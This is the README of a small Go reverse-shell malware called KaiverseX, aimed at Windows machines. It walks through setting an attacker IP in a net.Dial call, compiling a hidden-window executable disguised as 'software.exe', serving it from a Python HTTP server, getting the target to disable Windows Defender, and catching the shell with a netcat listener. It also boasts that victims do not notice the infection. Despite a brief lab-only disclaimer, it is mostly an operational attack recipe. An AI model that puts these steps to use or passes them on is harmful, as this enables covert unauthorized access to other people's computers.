KaiverseX is a small malware made in Go with the purpose of gaining access to a Windows machine remotely through reverse shell.
This payload allows Pantesters to experiment over TCP connections and can be useful for those who are learning about reverse engineering and malware analysis.

The payload does NOT include any obfuscation attemp or any other syscall than TCP conection. It is a ethical purpose working. However, this payload
can be used for gain access into machines you don't have permissions. Please, allways use it in Virtual Machines or controlled LABs.

 //  KaiverseX made by @kaijulele - CyberWarrior . https://t.me/@kaijulele


--------------------------------------------------------------------------------------------------------------------------------------------------------------

💥 one single feature

 > The payload hides "cmd.exe". Therefore, the victim does not realize that he has been infected except for Windows Defender

 > Free navigation unless target shut down the machine.

--------------------------------------------------------------------------------------------------------------------------------------------------------------

⚙️  How to activate?

 Since you've cloned the repo. Just navigate into it and execute the command "nano reverse_shell.go". Then, replace the part
 
  > net.Dial("tcp", "Put_attacker_ip_machine:4444")   to  >  your attacker IP_MACHINE in the part "Put_attacker_ip_machine" and keep the port 4444.

  expected :  >  net.Dial("tcp", "192.168.1.101:4444) 
  
  
 Next that, compile with :
 
  >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go 
 
🚫 If compile does no run successfully :

  >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------

👾 How i infect the target ?

 Firts, make sure you have installed python3.
 
  > python3 --version
  
  expected output : >  Python 3.13.5
  
  Then, Make a temporal server.
  
  > python3 -m http.server 8000
  
  expected output : >

                    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

 The target machine must open web browser and type 

  > http://attacker_machine_ip:8000

 Then just disable win defender and download the previous compiled *software.exe*

----------------------------------------------------------------------------------------------------------------------------------------------------------------

😈 Final attack 

 Start to listen with nc in the port 4444

  > sudo nc -lvnp 4444

  expected output : Listening on 0.0.0.0 4444

 Just double click on software.exe in target machine and...

✅ Stablished conection. 
 
📹 see demo in **demo.mp4** 




